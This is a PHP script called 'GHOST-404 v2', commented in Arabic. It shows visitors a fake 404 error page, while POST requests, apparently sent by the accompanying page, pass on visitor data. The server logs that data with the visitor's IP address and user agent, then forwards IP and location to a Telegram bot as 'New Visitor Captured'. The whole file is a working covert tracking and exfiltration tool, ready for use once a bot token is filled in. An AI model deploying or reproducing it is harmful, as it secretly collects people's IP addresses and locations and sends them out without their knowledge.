<?php
/* ============================================================
   GHOST-404 v2 — index.php
   - الزيارات العادية: بيبعت كود 404 حقيقي + صفحة ghost.html
   - طلبات POST من الصفحة: بيخزن البيانات ويرحلها لتليجرام
     (وميزة إضافية: بياخد IP الزائر من السيرفر مباشرة REMOTE_ADDR
     واللي هو أدق من اللي بتجيبه الـ APIs)
   ============================================================ */

// ---------- إعدادات تيليجرام (نفس اللي في ghost.html) ----------
define('TG_TOKEN',   'ضع_التوكن_هنا');
define('TG_CHAT_ID', 'ضع_الايدي_هنا');

// ---------- لو ده طلب إرسال بيانات (POST) ----------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $raw  = file_get_contents('php://input');
    $data = json_decode($raw, true);
    if (!$data) $data = $_POST;

    // سجل محلي احتياطي في logs/
    $dir = __DIR__ . '/logs';
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    $entry = [
        'time'       => date('Y-m-d H:i:s'),
        'server_ip'  => $_SERVER['REMOTE_ADDR'] ?? '',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'data'       => $data
    ];
    @file_put_contents($dir . '/visits_' . date('Y-m-d') . '.jsonl',
        json_encode($entry, JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND);

    // الترحيل لتليجرام
    if (TG_TOKEN && strpos(TG_TOKEN, 'ضع') !== 0) {
        $ip   = $data['ip_info']['ip'] ?? 'N/A';
        $loc  = implode(' - ', array_filter([
                    $data['ip_info']['country'] ?? '',
                    $data['ip_info']['city'] ?? '',
                    $data['ip_info']['region'] ?? ''
                ]));
        $text = "== New Visitor Captured (server-side) ==\n"
              . "Time: " . $entry['time'] . "\n"
              . "Server IP: " . $entry['server_ip'] . "\n"
              . "Client IP: " . $ip . "\n"
              . "Location: " . ($loc ?: 'N/A') . "\n"
              . "Page: " . ($data['page'] ?? 'N/A');

        $payload = json_encode([
            'chat_id' => TG_CHAT_ID,
            'text'    => $text,
            'disable_web_page_preview' => true
        ]);

        $ctx = stream_context_create([
            'http' => [
                'method'  => 'POST',
                'header'  => "Content-Type: application/json\r\n",
                'content' => $payload,
                'timeout' => 10
            ]
        ]);
        @file_get_contents('https://api.telegram.org/bot' . TG_TOKEN . '/sendMessage', false, $ctx);
    }

    http_response_code(200);
    echo '{"status":"ok"}';
    exit;
}

// ---------- أي زيارة عادية: 404 حقيقي + الشكل ----------
http_response_code(404);
header('Content-Type: text/html; charset=utf-8');
readfile(__DIR__ . '/ghost.html');
